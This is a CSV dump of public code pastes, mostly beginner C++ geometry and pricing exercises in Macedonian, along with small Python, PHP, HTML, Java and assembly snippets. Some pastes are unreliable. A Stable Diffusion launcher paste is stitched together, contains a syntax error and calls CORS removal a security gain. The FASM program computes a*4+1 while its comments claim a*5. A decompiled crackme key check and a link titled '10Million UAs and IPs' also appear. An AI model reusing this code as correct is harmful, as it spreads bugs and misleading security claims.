id,title,username,language,date,content
yknjrTH2,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:58:24 AM CDT,"#include <iostream>
using namespace std;
 
int main() {
    float cena;
    cin >> cena;
    
    float kolicina;
    cin >> kolicina;
    float iznos;
    cin >> iznos;
    
    float kusur = iznos - (kolicina * cena);
    cout << kusur << endl;
    return 0;
}
"
Mkjvgw5B,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:55:06 AM CDT,"#include <iostream>
using namespace std;
 
int main() {
    float a;
    cin >> a;
    
    float perimetar = 2 * a * 3.1415;
    float plostina = a * a * 3.1415;
    
    cout << ""Perimetar e "" << perimetar << "", a plostinata e "" << plostina << endl;
    return 0;
}
"
bZb9KhRr,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:53:55 AM CDT,"#include <iostream>
using namespace std;
 
int main() {
    float a;
    cin >> a;
    
    float perimetar = 4 * a;
    float plostina = a * a;
    
    cout << ""Perimetar e "" << perimetar << "", a plostinata e "" << plostina << endl;
    return 0;
}
"
3Nf7xuYf,Untitled,binarydepth,Python,Tuesday 12th of March 2024 10:53:20 AM CDT,"import os
import time

import torch
import torch.nn as nn
import torch.optim as optim
import torch.nn.utils.prune as prune

from modules import timer
from modules import initialize_util
from modules import initialize

startup_timer = timer.startup_timer
startup_timer.record(""launcher"")

initialize.imports()

initialize.check_versions()

def optimize_model(model):
    # Prune unnecessary connections from the model
    prune.l1_unstructured(model.fc1, name='weight', amount=0.5)
    # Split the model into smaller modules
    model_chunk1 = nn.Sequential(model.fc1, model.relu)
    model_chunk2 = model.fc2
    # Share parameters between layers of the model
    model.fc2.weight = nn.Parameter(model.fc1.weight.clone())
    model.fc2.bias = nn.Parameter(model.fc1.bias.clone())

def create_model(input_dim, hidden_dim, output_dim):
    # Define a simple neural network architecture
    model = SimpleNet(input_dim, hidden_dim, output_dim)
    # Optimize the model for memory usage
    optimize_model(model)
    return model

def process_prompt(prompt):
    # Process the prompt here
    pass

def webui():
    from modules.shared_cmd_options import cmd_opts

    launch_api = cmd_opts.api
    initialize.initialize()

    from modules import shared, ui_tempdir, script_callbacks, ui, progress, ui_extra_networks

    if shared.opts.clean_temp_dir_at_start:
        ui_tempdir.cleanup_tmpdr()
        startup_timer.record(""cleanup temp dir"")

    script_callbacks.before_ui_callback()
    startup_timer.record(""scripts before_ui_callback"")

    if not cmd_opts.no_gradio_queue:
        shared.demo.queue(64)

    gradio_auth_creds = list(initialize_util.get_gradio_auth_creds()) or None

    auto_launch_browser = False
    if os.getenv('SD_WEBUI_RESTARTING') != '1':
        if shared.opts.auto_launch_browser == ""Remote"" or cmd_opts.autolaunch:
            auto_launch_browser = True
        elif shared.opts.auto_launch_browser == ""Local"":
            auto_launch_browser = not cmd_opts.webui_is_non_local

    app, local_url, share_url = shared.demo.launch(
        share=cmd_opts.share,
        server_name=initialize_util.gradio_server_name(),
        server_port=cmd_opts.port,
        ssl_keyfile=cmd_opts.tls_keyfile,
        ssl_certfile=cmd_opts.tls_certfile,
        ssl_verify=cmd_opts.disable_tls_verify,
        debug=cmd_opts.gradio_debug,
        auth=gradio_auth_creds,
        inbrowser=auto_launch_browser,
        prevent_thread_lock=True,
        allowed_paths=cmd_opts.gradio_allowed_path,
        app_kwargs={
            ""docs_url"": ""/docs"",
            ""redoc_url"": ""/redoc"",
        },
        root_path=f""/{cmd_opts.subpath}"" if cmd_opts.subpath else """",
    )

    startup_timer.record(""gradio launch"")

    # Remove the CORS middleware to enhance security
    app.user_middleware = [x for x in app.user_middleware if x.cls.__name__ != 'CORSMiddleware']

    initialize_util.setup_middleware(app)

    progress.setup_progress_api(app)
    ui.setup_ui_api(app)

    if launch_api:
        create_api(app)

    ui_extra_networks.add_pages_to_demo(app)

    startup_timer.record(""add APIs"")

    with startup_timer.subcategory(""app_started_callback""):
        script_callbacks.app_started_callback(shared.demo, app)

    timer.startup_record = startup_timer.dump()
    print(f""Startup time: {startup_timer.summary()}."")

    try:
        while True:
            server_command = shared.state.wait_for_server_command(timeout=5)
            if server_command:
                if server_command in (""stop"", ""restart""):
                    break
                else:
                    print(f""Unknown server command: {server_command}"")

            # Process prompt
            prompt = # Get the prompt data
            process_prompt(prompt)
    except KeyboardInterrupt:
        print('Caught KeyboardInterrupt, stopping...')
        server_command = ""stop""

    if server_command == ""stop"":
        print(""Stopping server..."")
        # If we catch a keyboard interrupt, we want to stop the server and exit.
        shared.demo.close()

    # disable auto launch webui in browser for subsequent UI Reload
    os.environ.setdefault('SD_WEBUI_RESTARTING', '1')

    print('Restarting UI...')
    shared.demo.close()
    time.sleep(0.5)
    startup_timer.reset()
    script_callbacks.app_reload_callback()
    startup_timer.record(""app reload callback"")
    script_callbacks.script_unloaded_callback()
    startup_timer.record(""scripts unloaded callback"")
    initialize.initialize_rest(reload_script_modules=True)


if __name__ == ""__main__"":
    from modules.shared_cmd_options import cmd_opts

    if cmd_opts.nowebui:
        api_only()
    else:
        webui()
"
BRFSSMaB,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:52:53 AM CDT,"#include <iostream>
using namespace std;
 
int main() {
    float a, b;
    cin >> a >> b;
    
    float perimetar = 2 * a + 2 * b;
    float plostina = a * b;
    
    cout << ""Perimetar e "" << perimetar << "", a plostinata e "" << plostina << endl;
    return 0;
}
"
4fz1P0KC,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:48:15 AM CDT," int a = 3, b = -18;
    
    int x = -b / a;
    cout << x << endl;"
FgRLgVSM,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:45:46 AM CDT,"int agol = 30;
    int vrv = (180 - 30) / 2;
    cout << vrv << endl;"
6wzDNzkT,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:41:44 AM CDT,"float a = 8.5;
    
    float perimetar = 4 * a;
    float plostinata = a * a;
    
    cout << ""Plostina "" << plostinata << "", perimetar "" << perimetar << endl;"
p1Wa1Apq,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:39:51 AM CDT,"float r = 2.5;
    
    float plostina = r * r * 3.1415;
    cout << ""Plostinata na krugot so radiusot r="" << r << "" iznesuva "" << plostina << endl;
    "
DsanJ60S,Cardigan,psychoticodes,HTML,Tuesday 12th of March 2024 10:37:39 AM CDT,"<link href=""https://dl.dropboxusercontent.com/scl/fi/gzgzh8s0kybo2dg3sbm8y/cardigan.css?rlkey=ba4fpsrny4z0cyam8iww63k0a&dl=0"" rel=""stylesheet""><div id=""cardigan"" style=""--width:550px;--back:#080808; --color:#ffffff;""><div class=""card"">And when I felt like I was an old <i>cardigan</i> Under someone's bed</div><div class=""digdbor""></div><div class=""carbor""></div><div class=""carbt"">You put me on and said I was your favorite</div><div class=""digan"">Seu texto vai aqui</div></div>"
wUkFD830,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:37:33 AM CDT,"    float a = 8.5, b = 3.2;
    float plostina = a * b;
    cout << ""Plostinata na pravoagolnikot so stranite a="" << a << "" i b="" << b << "" iznesuva "" << plostina << endl;
"
PSMUmKe7,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:33:30 AM CDT,"int kolicina = 24;
    float cena = 12.5;
    
    cout << ""kolicina"" << endl;
    cout << ""cena"" << endl;
    
    cout << kolicina << endl;
    cout << cena << endl;
    
    cout << ""kolicina="" << kolicina << "", cena="" << cena << endl;"
SBuBtXpe,recursive-fibonacci-generator-returns-list,farry,Python,Tuesday 12th of March 2024 10:24:38 AM CDT,"def fibonacci(n):
    if n==0:
        return [0]
    elif n==1:
        return [0, 1]
    else:
        f = fibonacci(n-1)
        f.append(f[-1] + f[-2])
        return f
        
print(fibonacci(16))
"
WvrWHD6w,FASM  = a * 5 – (b + c + d) / 2,dllbridge,ASM (NASM),Tuesday 12th of March 2024 10:06:16 AM CDT,"format  PE console
entry   start
include 'win32ax.inc'
include 'api\kernel32.inc'


;----------------------------------------------------------------------
section '.idata' import data readable
library kernel32, 'kernel32.dll',\
        msvcrt,     'msvcrt.dll'
 
import  msvcrt,\
        printf, 'printf',\
        scanf , 'scanf'



;                                              a * 5 – (b + c + d) / 2
;----------------------------------------------------------------------
section '.data' data readable writeable

           a     dd  1
           b     dd  2
           c     dd  3
           d     dd  4
           r_1   dd  ?     ; = a * 5
           r_2   dd  ?     ; = b + c + d
           r_3   dd  ?     ; = r_2 / 2
           r_4   dd  ?     ; = r_1 - r_3     = a * 5 – (b + c + d) / 2

;----------------------------------------------------------------------
section '.code' code readable executable

start:    call Get_var

          call test_var

          mov eax, [a]      ; r_1 = a * 5
          shl eax, 2
          inc eax
          mov [r_1], eax

          mov eax  , [b]     ; r_2 * a + b + c
          add eax  , [c]
          add eax  , [d]
          mov [r_2], eax

          shr eax, 1         ; r_3 = r_2 / 2
          mov [r_3], eax


          mov eax, [r_1]     ; r-1 - r_3
          sub eax, [r_3]
          mov [r_4], eax

          call test_r_x
          cinvoke  printf, <""         "", 10, 0>
          cinvoke  printf, <""Answer:  "", 10, 0>
          cinvoke  printf, <""- - - - - - - - - - - - - - - - -"", 10, 0>
          cinvoke  printf, <""a * 5 - (b + c + d) / 2 = %d"", 10, 0>, [r_4]
          ;------------------------
          cinvoke  scanf, <""%d"", 10, 0>, 76313
          invoke   ExitProcess, 0






; Функция ожидает от пользователя ввод:  a, b, c, d
; Например, так: 1 22 3 7
;/////////////////////////////////////////////////////////////
proc    Get_var                                            ;//
 
        cinvoke  printf, <""Enter: a, b, c and d:  "", 0>

        cinvoke  scanf, <""%d%d%d%d"">, a, b, c, d
        ret
endp
 
 
 


;Процедура, которая показывает содержимое: a, b, c, d
;----------------------------------------------------------------------
test_var:   cinvoke  printf,           <10, 0>
            cinvoke  printf, <""a = %d"", 10, 0>, [a]
            cinvoke  printf, <""b = %d"", 10, 0>, [b]
            cinvoke  printf, <""c = %d"", 10, 0>, [c]
            cinvoke  printf, <""d = %d"", 10, 0>, [d]
ret                                                                    ;Возврат из процедуры

;Процедура, которая показывает содержимое: a, b, c, d
;----------------------------------------------------------------------
test_r_x:   cinvoke  printf,           <10, 0>
            cinvoke  printf, <""    a * 5 = r_1 = %d"", 10, 0>, [r_1]
            cinvoke  printf, <""b + c + d = r_2 = %d"", 10, 0>, [r_2]
            cinvoke  printf, <""  r_2 / 2 = r_3 = %d"", 10, 0>, [r_3]
            cinvoke  printf, <""r_1 - r_3 = r_4 = %d"", 10, 0>, [r_4]
ret



            "
yDsBueNk,10Million UAs and IPs,Nil000,C++,Tuesday 12th of March 2024 09:59:45 AM CDT,https://www.up-4ever.net/zhvqxboaozmo
TxFw8YEN,planes.py,puente,Python,Tuesday 12th of March 2024 09:46:56 AM CDT,"import numpy as np
import pandas as pd
from datetime import datetime, timedelta
import time

def generar_muestras(hora_inicio, n_muestras=100):
    np.random.seed(0)  # Para reproducibilidad
    tiempos_inicio = []
    tiempos_fin = []
    percentages = []
    hora_actual = datetime.strptime(hora_inicio, ""%Y-%m-%d %H:%M:%S"")


    for i in range(n_muestras):
        np.random.seed(seed=None)
        prob = np.random.random()  # Genera un número aleatorio entre 0 y 1

        start = hora_actual
        percentage = 0

        # Asigna un tiempo basado en la probabilidad
        if prob <= 0.3:
            delta = np.random.uniform(2, 3)
            percentage = 30
        elif prob <= 0.65: #probailidades agregadas
            delta = np.random.uniform(3, 4)
            percentage = 35
        elif prob <= 0.9:
            delta = np.random.uniform(4, 5)
            percentage = 25
        else:
            delta = np.random.uniform(5, 6)
            percentage = 10
        
        # Añade el delta convertido a minutos al tiempo actual
        hora_actual += timedelta(minutes=delta)

        end = hora_actual
        tiempos_inicio.append(start)
        tiempos_fin.append(end)
        percentages.append(percentage)

        time.sleep(0.1)

    return tiempos_inicio, tiempos_fin, percentages

# Genera las muestras
hora_inicio = ""2024-01-01 12:10:00""
muestras_inicio, muestras_final, porcentajes = generar_muestras(hora_inicio)

def formatear_fecha(fecha):
    return f""Day 1, {fecha.strftime('%H:%M:%S')}""

# Aplica la función de formateo a las muestras
muestras_formateadas_inicio = [formatear_fecha(fecha) for fecha in muestras_inicio]
muestras_formateadas_final = [formatear_fecha(fecha) for fecha in muestras_final]

# Convierte las muestras a un DataFrame de pandas
df = pd.DataFrame(muestras_formateadas_inicio, columns=['Starting Offset'])
df['Ending Offset'] = muestras_formateadas_final
df['Rate (events per hour)'] = porcentajes

# Guarda el DataFrame en un archivo Excel
nombre_archivo = ""./plane_arrival.xlsx""
df.to_excel(nombre_archivo, index=False)"
kd4xE1zv,WordPress: Protect custom post type with a predefined password,YordanSoares,PHP,Tuesday 12th of March 2024 09:45:05 AM CDT,"<?php
/**
 * WordPress:
 * Protect custom post type with a predefined password
 */
add_action( 'the_post', function( $post ){
	if ( $post->post_type == 'gallery' ) { // Write the custom post type ID here
		$post->post_password = 'MyP@sSW0rD'; // The predefined password goes here
	}
} );"
T4M0aeKt,Untitled,fdsafdsagdsafsda,C++,Tuesday 12th of March 2024 09:27:06 AM CDT,"#include <iostream>
#include <string.h>

typedef unsigned uint;

int main()
{
   char *tmp_str_pointer;
   char password[16] = ""12345678"";
   unsigned int some_array[8];

   std::cout<<""Enter key: "";
   std::cin>>password;
   if (strlen(password) != 8)
   {
      std::cout<<""No more""<<std::endl;
      return 0;
   }

   for (size_t i = 0; i < 8; i++)
   {
      some_array[i] = (int)password[i];
   }
   
   int iVar8 = 0;
   int local_60 = 0;
   int local_58 = 0;
   int local_50 = 0;
   int outside_index = 0;
   int inside_index = 0;
   int iVar4;
   int iVar7;
   int iVar9;
   int result = 0;
   int iVar11 = 0;
   int uVar5 = 0;
   do
   {
      iVar4 = some_array[outside_index];
      inside_index = 1;
      iVar7 = result;
      if (1 < iVar4)
      {
         do
         {
            result = iVar7;
            iVar9 = local_60;
            if ((iVar4 % inside_index == 0) &&
                ((iVar9 = local_60 + 1, (inside_index & 0xfffffffeU) != 0x3a ||
                                            (result = some_array[2], iVar9 != 3))))
            {
               if (iVar9 == 10)
               {
                  iVar11 = iVar11 + 1;
                  result = iVar7;
                  if (inside_index - 0xcU < 3)
                  {
                     local_58 = inside_index;
                  }
               }
               else if (iVar9 == 0xb)
               {
                  result = iVar7;
                  if ((inside_index - 0x12U < 3) &&
                      (local_50 = local_58 + inside_index, local_50 == 0x1e))
                  {
                     result = iVar7 + inside_index + iVar11;
                  }
               }
               else
               {
                  iVar4 = iVar11 + inside_index;
                  if (2 < local_60 - 0xbU)
                  {
                     iVar4 = iVar11;
                  }
                  iVar11 = iVar4;
                  if (iVar9 == 0x16)
                  {
                     result = iVar7 + 2 + (uint)inside_index / 5 + iVar4;
                  }
                  else
                  {
                     if (local_60 - 0x1fU < 5)
                     {
                        iVar7 = iVar7 + local_50 + inside_index;
                     }
                     local_50 = iVar8 + inside_index;
                     if (4 < local_60 - 0x1fU)
                     {
                        local_50 = iVar8;
                     }
                     uVar5 = -(uint)(4 < local_60 - 0x1fU) & local_58;
                     if (local_60 - 0x2aU < 4)
                     {
                        iVar7 = iVar7 + uVar5 + inside_index;
                     }
                     local_58 = uVar5 + inside_index;
                     if (3 < local_60 - 0x2aU)
                     {
                        local_58 = uVar5;
                     }
                     result = iVar7;
                     if ((((local_60 - 0x2eU < 4) && (local_58 == 0x73)) && (local_50 == 0x83)) &&
                         (iVar11 = iVar4 + inside_index, iVar11 == 0x93))
                     {
                        std::cout << ""already a little bit..."" << std::endl;
                        result = iVar7 + -0x93;
                     }
                  }
               }
            }
            local_60 = iVar9;
            inside_index = inside_index + 1;
            iVar4 = some_array[outside_index];
            iVar7 = result;
            iVar8 = local_50;
         } while (inside_index < iVar4);
      }
      outside_index = outside_index + 1;
   } while (outside_index < 8);

   if (result != 0x327)
   {
      std::cout << ""Wrong key :("" << std::endl;
   }
   else
   {
      std::cout << ""Good! :)"" << std::endl;
   }

   return 0;
}"
ZeJnCwgT,Custom Toast,SenpaiZero,Java,Tuesday 12th of March 2024 08:50:03 AM CDT,"private void showCustomToast_main(String message, long duration)
    {
        final TextView toastText = customCardView.findViewById(R.id.toast_text);
        toastText.setText(message);

        customCardView.setVisibility(View.VISIBLE);

        ObjectAnimator fadeOut = ObjectAnimator.ofFloat(customCardView, ""alpha"", 1f, 0f);
        fadeOut.setDuration(duration);

        fadeOut.addListener(new AnimatorListenerAdapter() {
            @Override
            public void onAnimationEnd(Animator animation) {
                super.onAnimationEnd(animation);
                customCardView.setVisibility(View.GONE);
            }
        });

        fadeOut.start();
    }"
